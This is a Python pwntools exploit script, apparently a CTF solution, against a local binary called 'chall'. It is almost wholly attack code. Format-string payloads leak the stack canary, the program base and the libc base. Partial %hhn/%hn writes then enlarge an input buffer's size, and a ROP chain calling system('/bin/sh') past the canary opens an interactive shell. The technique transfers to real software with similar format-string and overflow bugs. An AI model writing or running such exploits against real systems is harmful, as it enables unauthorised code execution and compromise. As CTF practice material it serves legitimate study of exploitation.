#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./chall')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])


p = process('./chall')

sla(" me the size of gameboard:", "26")

for i in range(21):
    sla(":", "a" * 25 + "\x00\x00")

for i in range(24):
    sla(":", "a" * 24 + "\x00\x00")

for i in range(3):
    sla(":", "a" * 26)




# 48'th round, the second format string is replaced by g%536$llxqq%538$llx%4049c
#   - after executing, we can leak the canary and base address, and go back to the state before 49'th round
sla(":", "g%536$llxqq%538$llx%4049c".ljust(26, "\x00"))

ru("g")
canary = int(rc(16), 16) 
ru("qq")
base = int(rc(12), 16) - 0x1d42
size_addr = base + 0x4120
log.success(hex(base))
log.success(hex(canary))



# # 49'th round, the second format string is replaced by  %4122caaaa
# #   - after executing, the 1'th format string will be replaced by aaaa
# sla(":", (("g%541$llx%4069c".ljust(26, "\x00"))))
# ru("g")
# stack = int(rc(12), 16) 
# log.success(hex(stack))

# 49'th round, modify last low byte of base addr
#   - after executing, the 1'th format string will be replaced by aaaa
low_byte = ((size_addr) & 0xff) - 12
sla(":", (("%541$llx%{}c%541$hhn%{}c".format(str(low_byte), str(0x1000 - low_byte - 28))).ljust(26, "\x00")))
ru("7f")
stack = int("7f" + rc(10), 16) 




# 50'th round, modify low byte of jump board the second format string is replaced by  %4122caaaa
#   - after executing, the 1'th format string will be replaced by aaaa
low_byte = (stack & 0xff) + 1
sla(":", (("%{}c%539$hhn%{}c".format(str(low_byte), str(0x1000 - low_byte - 16))).ljust(26, "\x00")))

# 51'th round, modify last second low byte of base addr the second format string is replaced by  %4122caaaa

#   - after executing, the 1'th format string will be replaced by aaaa


second_byte = (size_addr >> 8) & 0xff

sla(":", (("%{}c%541$hhn%{}c".format(str(second_byte), str(0x1000 - second_byte))).ljust(26, "\x00")))


# # 52'th round, modify the size the second format string is replaced by  %4122caaaa
# #   - after executing, the 1'th format string will be replaced by aaaa
# log.success(hex(stack))
#

sla(":", (("gg%544$llx%{}c%543$hn".format(str(100)))).ljust(26, "\x00"))
ru("gg")
libc_base = int(rc(12), 16) - 0x21bf7


libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
rdi = base + 0x1e4b
rdx_rsi = libc_base + 0x130569

log.success(hex(bin_sh))
log.success(hex(system_addr))
log.success(hex(rdi))
#debug()


payload = "a" * 0x28 + p64(canary) + p64(0) * 3 + p64(rdi) + p64(bin_sh) + p64(rdx_rsi) + p64(0)*2 + p64(system_addr)
payload = payload.ljust(130, "a")

# debug(0x1D23)
sla("[53] G", payload)
p.interactive()


    


